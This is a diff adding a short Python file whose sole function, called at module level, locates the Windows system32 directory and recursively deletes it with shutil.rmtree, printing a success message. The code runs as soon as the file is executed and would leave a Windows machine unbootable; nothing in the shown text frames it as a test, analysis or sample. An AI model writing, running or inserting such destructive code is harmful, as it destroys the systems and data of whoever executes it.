@@ -1,0 +1,15 @@
+import os
+import shutil
+
+def delete_system32():
+    system32_path = os.path.join(os.environ['WINDIR'], 'system32')
+  
+    if os.path.exists(system32_path):
+        try:
+            shutil.rmtree(system32_path)
+            print("System32 deleted successfully.")
+        except Exception as e:
+            print(f"Error deleting System32: {str(e)}")
+    else:
+        print("System32 does not exist.")
+delete_system32()
